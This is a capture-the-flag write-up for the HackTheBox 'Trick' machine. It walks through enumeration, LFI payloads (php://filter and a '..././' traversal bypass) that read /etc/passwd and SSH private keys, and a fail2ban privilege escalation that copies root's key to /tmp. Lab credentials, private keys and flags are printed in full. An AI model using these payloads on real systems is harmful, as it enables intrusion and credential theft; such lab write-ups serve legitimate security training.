# Trick - HackTheBox - Writeup
Linux, 20 Base Points, Easy

![info.JPG](images/info.JPG)

## Machine

![‏‏Trick.JPG](images/Trick.JPG)
 
## TL;DR

To solve this machine, we begin by enumerating open services using ```namp``` – finding ports ```22```, ```25```, ```53``` and ```80```.

***User***: By enumerating the ```DNS``` using ```dig``` we found ```trick.htb``` and ```preprod-payroll.trick.htb``` sub-domains, According to the subdomain pattern we found another subdomain ```preprod-marketing.trick.htb``` with a page that vulnerable to LFI, Using that we read the SSH private key of ```michael``` user.

***Root***: By running ```sudo -l``` we can see that we can restart ```fail2ban``` service, We can see also we are on ```security``` group and we can edit ```/etc/fail2ban/action.d``` directory, Using that we edit the ```actionban``` and ```actiounban``` on the file ```iptables-multiport.conf```, Trigger ```fail2ban``` by running brute force against SSH and we get the ```root``` SSH private key.

![pwn.JPG](images/pwn.JPG)


## Trick Solution

### User

Let's start with ```nmap``` scanning:

```console
┌─[evyatar@parrot]─[/hackthebox/Trick]
└──╼ $ nmap -sV -sC -oA nmap/Trick 10.10.11.166
Starting Nmap 7.80 ( https://nmap.org ) at 2022-06-26 23:37 IDT
Nmap scan report for 10.10.11.166
Host is up (0.18s latency).
Not shown: 996 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

By observing port 80 we get the following web page:

![port80.JPG](images/port80.JPG)

By enumerating port ```53``` using ```nslookup``` we can get the reverse lookup for the machine IP:
```console
nslookup
> server 10.10.11.166
Default server: 10.10.11.166
Address: 10.10.11.166#53
> 10.10.11.166
166.11.10.10.in-addr.arpa	name = trick.htb.

```

We found a domain ```trick.htb```, Let's add it to ```/etc/hosts```.

Let's use ```dig```:
```console
┌─[evyatar@parrot]─[/hackthebox/Trick]
└──╼ $ dig axfr trick.htb @10.10.11.166

; <<>> DiG 9.16.4-Debian <<>> axfr trick.htb @10.10.11.166
;; global options: +cmd
trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.		604800	IN	NS	trick.htb.
trick.htb.		604800	IN	A	127.0.0.1
trick.htb.		604800	IN	AAAA	::1
preprod-payroll.trick.htb. 604800 IN	CNAME	trick.htb.
trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 333 msec
;; SERVER: 10.10.11.166#53(10.10.11.166)
;; WHEN: Mon Jun 27 00:31:05 IDT 2022
;; XFR size: 6 records (messages 1, bytes 231)
```

We can see also ```preprod-payroll.trick.htb``` and ```root.trick.htb``` subdomains.

By browsing to [http://preprod-payroll.trick.htb/login.php](http://preprod-payroll.trick.htb/login.php) we get:

![preprod.JPG](images/preprod.JPG)

Let's use ```gobuster``` to search for ```php``` files:
```console
┌─[evyatar@parrot]─[/hackthebox/Trick]
└──╼ $ gobuster dir -u http://preprod-payroll.trick.htb/ -x php -w raft-medium-words.txt -t 100 -k --wildcard -o preprod.gobuster
...
/ajax.php             (Status: 200) [Size: 0]
/index.php            (Status: 302) [Size: 9546] [--> login.php]
/login.php            (Status: 200) [Size: 5571]                
/assets               (Status: 301) [Size: 185] [--> http://preprod-payroll.trick.htb/assets/]
/database             (Status: 301) [Size: 185] [--> http://preprod-payroll.trick.htb/database/]
/home.php             (Status: 200) [Size: 486]                                                 
/users.php            (Status: 200) [Size: 2197]                                                
/header.php           (Status: 200) [Size: 2548]                                                
/.                    (Status: 301) [Size: 185] [--> http://preprod-payroll.trick.htb/./]       
/employee.php         (Status: 200) [Size: 2717]                                                
/navbar.php           (Status: 200) [Size: 1382]                                                
/department.php       (Status: 200) [Size: 4844]                                                
/db_connect.php       (Status: 200) [Size: 0]                                                   
/payroll.php          (Status: 200) [Size: 3142]                                                
/position.php         (Status: 200) [Size: 5549]                                                
/topbar.php           (Status: 200) [Size: 585]                                                 
/attendance.php       (Status: 200) [Size: 4688]                                                
/site_settings.php    (Status: 200) [Size: 2273]
```

By observing [http://preprod-payroll.trick.htb/users.php](http://preprod-payroll.trick.htb/users.php) we get:

![users.JPG](images/users.JPG)

Let's click on [New User](http://preprod-payroll.trick.htb/manage_user.php):

We can see the ```Administrator``` user, Nothing happened by clicking on ```Edit``` button.

Let's observe the ```HTML``` source:
```HTML

<div class="container-fluid">
	
	<div class="row">
	<div class="col-lg-12">
			<button class="btn btn-primary float-right btn-sm" id="new_user"><i class="fa fa-plus"></i> New user</button>
	</div>
	</div>
	<br>
	<div class="row">
		<div class="card col-lg-12">
			<div class="card-body">
				<table class="table-striped table-bordered col-md-12">
			<thead>
				<tr>
					<th class="text-center">#</th>
					<th class="text-center">Name</th>
					<th class="text-center">Username</th>
					<th class="text-center">Action</th>
				</tr>
			</thead>
			<tbody>
								 <tr>
				 	<td>
				 		1				 	</td>
				 	<td>
				 		Administrator				 	</td>
				 	<td>
				 		Enemigosss				 	</td>
				 	<td>
				 		<center>
								<div class="btn-group">
								  <button type="button" class="btn btn-primary">Action</button>
								  <button type="button" class="btn btn-primary dropdown-toggle dropdown-toggle-split" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
								    <span class="sr-only">Toggle Dropdown</span>
								  </button>
								  <div class="dropdown-menu">
								    <a class="dropdown-item edit_user" href="javascript:void(0)" data-id = '1'>Edit</a>
								    <div class="dropdown-divider"></div>
								    <a class="dropdown-item delete_user" href="javascript:void(0)" data-id = '1'>Delete</a>
								  </div>
								</div>
								</center>
				 	</td>
				 </tr>
							</tbody>
		</table>
			</div>
		</div>
	</div>

</div>
<script>
	
$('#new_user').click(function(){
	uni_modal('New User','manage_user.php')
})
$('.edit_user').click(function(){
	uni_modal('Edit User','manage_user.php?id='+$(this).attr('data-id'))
})
$('.delete_user').click(function(){
		_conf("Are you sure to delete this user?","delete_user",[$(this).attr('data-id')])
	})
	function delete_user($id){
		start_load()
		$.ajax({
			url:'ajax.php?action=delete_user',
			method:'POST',
			data:{id:$id},
			success:function(resp){
				if(resp==1){
					alert_toast("Data successfully deleted",'success')
					setTimeout(function(){
						location.reload()
					},1500)

				}
			}
		})
	}
</script>
```

We can see that if we are clicking on ```Edit``` button we should navigate to ```uni_modal('Edit User','manage_user.php?id='+$(this).attr('data-id'))```.

Let's browse to this URL with ```id=1```: [http://preprod-payroll.trick.htb/manage_user.php?id=1](http://preprod-payroll.trick.htb/manage_user.php?id=1):

![editadmin.JPG](images/editadmin.JPG)

By observing the source code we can see the password is ```SuperGucciRainbowCake```.

Let's log in using the credentials ```Enemigosss:SuperGucciRainbowCake```:

![enemlogin.JPG](images/enemlogin.JPG)

And we get:

![dashboard.JPG](images/dashboard.JPG)

The URL of the home page is [http://preprod-payroll.trick.htb/index.php?page=home](http://preprod-payroll.trick.htb/index.php?page=home).

According to ```page=home``` we can try an LFI attack, We can read files using ```php://filter```.

By observing the following link [http://preprod-payroll.trick.htb/index.php?page=php://filter/convert.base64-encode/resource=home](http://preprod-payroll.trick.htb/index.php?page=php://filter/convert.base64-encode/resource=home) we get on the response content the Base64 of ```home.php``` file:

![repeaterhome.JPG](images/repeaterhome.JPG)

```console
PD9waHAgaW5jbHVkZSAnZGJfY29ubmVjdC5waHAnID8+DQo8c3R5bGU+DQogICANCjwvc3R5bGU+DQoNCjxkaXYgY2xhc3M9ImNvbnRhaW5lLWZsdWlkIj4NCg0KCTxkaXYgY2xhc3M9InJvdyI+DQoJCTxkaXYgY2xhc3M9ImNvbC1sZy0xMiI+DQoJCQkNCgkJPC9kaXY+DQoJPC9kaXY+DQoNCgk8ZGl2IGNsYXNzPSJyb3cgbXQtMyBtbC0zIG1yLTMiPg0KCQkJPGRpdiBjbGFzcz0iY29sLWxnLTEyIj4NCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkIj4NCiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC1ib2R5Ij4NCiAgICAgICAgICAgICAgICAgICAgPD9waHAgZWNobyAiV2VsY29tZSBiYWNrICIuICRfU0VTU0lPTlsnbG9naW5fbmFtZSddLiIhIiAgPz4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgPC9kaXY+DQoJPC9kaXY+DQoNCjwvZGl2Pg0KPHNjcmlwdD4NCgkNCjwvc2NyaXB0Pg== 
```

Decode it:
```php
<?php include 'db_connect.php' ?>
<style>
</style>
<div class="containe-fluid">
	<div class="row">
		<div class="col-lg-12">
		</div>
	</div>
	<div class="row mt-3 ml-3 mr-3">
			<div class="col-lg-12">
                <div class="card">
                    <div class="card-body">
                    <?php echo "Welcome back ". $_SESSION['login_name']."!"  ?>
                    </div>
                </div>
            </div>
	</div>
</div>
<script>
</script>
```

We can see it includes ```db_connect.php``` page, Let's read it using the same method: [http://preprod-payroll.trick.htb/index.php?page=php://filter/convert.base64-encode/resource=db_connect](http://preprod-payroll.trick.htb/index.php?page=php://filter/convert.base64-encode/resource=db_connect)

We get the following Base64:
```console
PD9waHAgDQoNCiRjb25uPSBuZXcgbXlzcWxpKCdsb2NhbGhvc3QnLCdyZW1vJywnVHJ1bHlJbXBvc3NpYmxlUGFzc3dvcmRMbWFvMTIzJywncGF5cm9sbF9kYicpb3IgZGllKCJDb3VsZCBub3QgY29ubmVjdCB0byBteXNxbCIubXlzcWxpX2Vycm9yKCRjb24pKTsNCg0K
```

Decode it:
```php
<?php 
$conn= new mysqli('localhost','remo','TrulyImpossiblePasswordLmao123','payroll_db')or die("Could not connect to mysql".mysqli_error($con));
```

And we found credentials of ```remo:TrulyImpossiblePasswordLmao123``` (Not working on SSH).

Because we know the pattern of the subdomain ```preprod-payroll.trick.htb``` we can search for another subdomain using the following:
```console
┌─[evyatar@parrot]─[/hackthebox/Trick]
└──╼ $ ffuf -u http://trick.htb -w subdomains-top1milion.txt -H 'Host: preprod-FUZZ.trick.htb' -fw 1697
...
marketing               [Status: 200, Size: 9660, Words: 3007, Lines: 179]
payroll                 [Status: 302, Size: 9546, Words: 1453, Lines: 267
```

We found another subdomain [http://preprod-marketing.trick.htb](http://preprod-marketing.trick.htb):

![marketing.JPG](images/marketing.JPG)

By clicking on [About](http://preprod-marketing.trick.htb/index.php?page=about.html) we can see the URL behind which is [http://preprod-marketing.trick.htb/index.php?page=about.html](http://preprod-marketing.trick.htb/index.php?page=about.html).

Let's try again LFI, We can guess there is a filter that replaces all ```../``` to prevent LFI.

We can bypass it by sending ```..././etc/passwd```.

We can guess that we are on ```/var/www/<DIR>``` so we need three directories before to access to```/etc/passwd```.

Let's try the following URL: [http://preprod-marketing.trick.htb/index.php?page=..././..././..././etc/passwd](http://preprod-marketing.trick.htb/index.php?page=..././..././..././etc/passwd)

And we get:
```HTTP
HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Thu, 21 Jul 2022 22:46:29 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 2351

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false
dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
pulse:x:109:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
saned:x:112:121::/var/lib/saned:/usr/sbin/nologin
colord:x:113:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:114:123::/var/lib/geoclue:/usr/sbin/nologin
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:118:65534::/run/sshd:/usr/sbin/nologin
postfix:x:119:126::/var/spool/postfix:/usr/sbin/nologin
bind:x:120:128::/var/cache/bind:/usr/sbin/nologin
michael:x:1001:1001::/home/michael:/bin/bash
```

We have another LFI.

As we can see, we have two users with ```/bin/bash``` - ```root``` and ```michael```.

Let's read ```michael``` SSH private key using the following URL: [http://preprod-marketing.trick.htb/index.php?page=..././..././..././home/michael/.ssh/id_rsa](http://preprod-marketing.trick.htb/index.php?page=..././..././..././home/michael/.ssh/id_rsa):
```HTTP
HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Thu, 21 Jul 2022 22:48:10 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 1823

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz
c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G
YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+
4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/
Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4
1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC
DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0
+93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE
hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L
jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6
IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C
aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/
KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC
tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge
U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0
fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V
PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS
3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA
fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT
AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn
In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP
JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN
jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+
IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

Let's use this SSH private key to log in as ```michael```:
```console
┌─[evyatar@parrot]─[/hackthebox/Trick]
└──╼ $ ssh -i id_rsa michael@trick.htb
Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jul 21 08:47:18 2022 from 10.10.14.14
michael@trick:~$ cat user.txt
05ef0a325357c64e3a1ed330635f4dd4
```

And we get the user flag ```05ef0a325357c64e3a1ed330635f4dd4```.

### Root

By running ```sudo -l``` we get the following:
```console
michael@trick:~$ sudo -l
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```

To get privilege escalation using ```fail2ban``` we need access to ```/etc/fail2ban/action.d``` directory ([Reference](https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/)).

Let's check the permission of ```/etc/fail2ban/action``` directory:
```console
michael@trick:/etc/fail2ban/action.d$ ls -ltra /etc/fail2ban/
total 76
drwxr-xr-x 126 root root     12288 Jul 21 07:47 ..
-rw-r--r--   1 root root       738 Jul 22 01:30 paths-opensuse.conf
-rw-r--r--   1 root root       573 Jul 22 01:30 paths-debian.conf
-rw-r--r--   1 root root      2827 Jul 22 01:30 paths-common.conf
-rw-r--r--   1 root root       645 Jul 22 01:30 paths-arch.conf
-rw-r--r--   1 root root     22908 Jul 22 01:30 jail.conf
drwxr-xr-x   2 root root      4096 Jul 22 01:30 fail2ban.d
-rw-r--r--   1 root root      2334 Jul 22 01:30 fail2ban.conf
drwxrwx---   2 root security  4096 Jul 22 01:30 action.d
drwxr-xr-x   2 root root      4096 Jul 22 01:30 jail.d
drwxr-xr-x   3 root root      4096 Jul 22 01:30 filter.d
drwxr-xr-x   6 root root      4096 Jul 22 01:30 .
```

If we are running ```groups``` we can see we are in ```security``` group:
```console
michael@trick:/etc/fail2ban/action.d$ groups
michael security
```

Let's edit the file ```/etc/fail2ban/action.d/iptables-multiport.conf```:
```console
michael@trick:/etc/fail2ban/action.d$ cat iptables-multiport.conf 
# Fail2Ban configuration file
#
# Author: Cyril Jaquier
# Modified by Yaroslav Halchenko for multiport banning
#

[INCLUDES]

before = iptables-common.conf

[Definition]

# Option:  actionstart
# Notes.:  command executed once at the start of Fail2Ban.
# Values:  CMD
#
actionstart = <iptables> -N f2b-<name>
              <iptables> -A f2b-<name> -j <returntype>
              <iptables> -I <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>

# Option:  actionstop
# Notes.:  command executed once at the end of Fail2Ban
# Values:  CMD
#
actionstop = <iptables> -D <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>
             <actionflush>
             <iptables> -X f2b-<name>

# Option:  actioncheck
# Notes.:  command executed once before each actionban command
# Values:  CMD
#
actioncheck = <iptables> -n -L <chain> | grep -q 'f2b-<name>[ \t]'

# Option:  actionban
# Notes.:  command executed when banning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionban = cat /root/.ssh/id_rsa > /tmp/.id && chmod 777 /tmp/.id

# Option:  actionunban
# Notes.:  command executed when unbanning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionunban = cat /root/.ssh/id_rsa > /tmp/.id && chmod 777 /tmp/.id

[Init]
```

We change the ```actionban``` and ```actionunban``` - when the user gets banned ```fail2ban``` will run our payload.

After changing the configuration file we need to do a restart to ```fail2ban``` service using:
```console
michael@trick:~$ sudo /etc/init.d/fail2ban restart
```

To trigger that we need to try a few SSH logins attempts, We can do it using [patator](https://github.com/lanjelot/patator) as follow:
```console
┌─[evyatar@parrot]─[/hackthebox/Trick]
└──╼ $ patator ssh_login host=trick.htb user=FILE0 0=logins.txt password=$(perl -e "print 'A'x50000")
02:52:44 patator    INFO - Starting Patator 0.8 (https://github.com/lanjelot/patator) with python-3.8.5 at 2022-07-22 02:52 IDT
02:52:44 patator    INFO -                                                                              
02:52:44 patator    INFO - code  size    time | candidate                          |   num | mesg
02:52:44 patator    INFO - -----------------------------------------------------------------------------
02:52:45 patator    INFO - 1     22     0.735 | index                              |     1 | Authentication failed.
02:52:45 patator    INFO - 1     22     0.626 | images                             |     2 | Authentication failed.
02:52:45 patator    INFO - 1     22     0.606 | 12                                 |    10 | Authentication failed.
02:52:45 patator    INFO - 1     22     0.629 | download                           |     3 | Authentication failed.
02:52:45 patator    INFO - 1     22     0.651 | news                               |     5 | Authentication failed.
02:52:45 patator    INFO - 1     22     0.682 | serial                             |     7 | Authentication failed.
....
```

And after a few SSH failed logins we can see ```fail2ban``` action creates the file ```/tmp/.id``` with ```root``` SSH private key:
```console
michael@trick:/etc/fail2ban$ cat /tmp/.id
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAoSBXc6x1gauygp8zl8Y13QXTwj633MsMv/0YsBzmGiHb1xBadkGC
6a0abDxM4UycoYN82sT7N732cJqL9mWK7ZeGPQX4+RHD0fQnVQY3KCYak7RxQQtilsErhG
VgovwAtnbaKA+tlfsO7IlD3Mv6lbJ/ElD9drwhJOVdEf4IL+8SstVgd0AehVQgnLXd58MK
7tuKX+a/+eBBjzfpA6hWIzTT3koLnMoTWe5uCuhIJiaBUQyvrBQ1C/M4E7rnHw6Rgh9x9d
1LPInu0NMxbw0LAuFaQRcz3ewzEt8M2d639vedwahK5MyuTQS/ZTt33yjoas40kv+NZ5Y0
5vVeP6XxcwAAA8jXOo441zqOOAAAAAdzc2gtcnNhAAABAQChIFdzrHWBq7KCnzOXxjXdBd
PCPrfcywy//RiwHOYaIdvXEFp2QYLprRpsPEzhTJyhg3zaxPs3vfZwmov2ZYrtl4Y9Bfj5
EcPR9CdVBjcoJhqTtHFBC2KWwSuEZWCi/AC2dtooD62V+w7siUPcy/qVsn8SUP12vCEk5V
0R/ggv7xKy1WB3QB6FVCCctd3nwwru24pf5r/54EGPN+kDqFYjNNPeSgucyhNZ7m4K6Egm
JoFRDK+sFDUL8zgTuucfDpGCH3H13Us8ie7Q0zFvDQsC4VpBFzPd7DMS3wzZ3rf2953BqE
rkzK5NBL9lO3ffKOhqzjSS/41nljTm9V4/pfFzAAAAAwEAAQAAAQEAkxF9ITUZ8GjywC1m
HzOpOHu4JIWwtxSTJ65x2VYXZWTgT7Y6i9QSFQ6OnpqPpdmS4g2tadYAY4m9plw6QoW+wE
zdF1gbP+RKM5pCSGYq9DeLbKR392HX9DiPawJJqZqRX/qt94EP9WS544cK7T82E2tgdyx7
nePr8Mx2HhUcDfsbxQlRbM9oKqIBQ0v9GdBotvi+Ri/IQfpEpmS64cU450/DlrwQ358MU9
i8so0KlnAHLYxgzhEzPjPehaRShcsRdhasw1/xVKk7PoBvXzz9r+Ywo5b2htiYzqxt5N5i
E8UOrUeYb7G21QjuhKB9KerukyGeHdBPjqvYuYjTwf2dUQAAAIEAnSUxZdekVLY0IoYPBF
DBDIMkk97Kq2v8H51L9Q0rKBs79x4ZaV56LfMnTxuAxwnUMUauyPeGZFDgVsFwg0JK+vbR
Kj9idBoMTOuDdfTE4IJtT3tEKClzFS9YSrYdQ78OUu8Kip3p5OuWfrzTuhRCKZ2cwd86WU
ghEBWtHhn/2RsAAACBANHocGFZWWM1DGtA3ZXiytuJLh7D55NUPk7jumm+qcF7UUiKaRHA
QnQ44oxHssJbkGi4S3tvfSlXFtNboQCt3q5Wgc3wl4S+sBGoq1xsZuXAz/3QX2AjXSpN/S
PkO+h4pk25aAFjGmAMMoH1Ty9v2X8ahYRY5EV8Y/LRcMF32Z5rAAAAgQDEgb1hc85TS0Wz
pmGTto+ok3eI/10wxgbZXtdki7Jn1npNI5S7lh0r76jqEn5edcIYlwcUV+b6dCucDUhUHl
7VT/uoy+BKbanLzM809KCnuLCM7LDISk4N/S79xiuFlrk11MrV2qaxZANiYEkOd1jKRGPi
UDRYRn2lPX7WiLyrGQAAAApyb290QHRyaWNrAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
```

Let's log in using this SSH private key as ```root```:
```console
┌─[evyatar@parrot]─[/hackthebox/Trick]
└──╼ $ sh -i root_id_rsa root@trick.htb
Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@trick:~# cat root.txt
e6fce1ab65cc5dcd3e62f050a683ec49
```

And we get the root flag ```e6fce1ab65cc5dcd3e62f050a683ec49```.
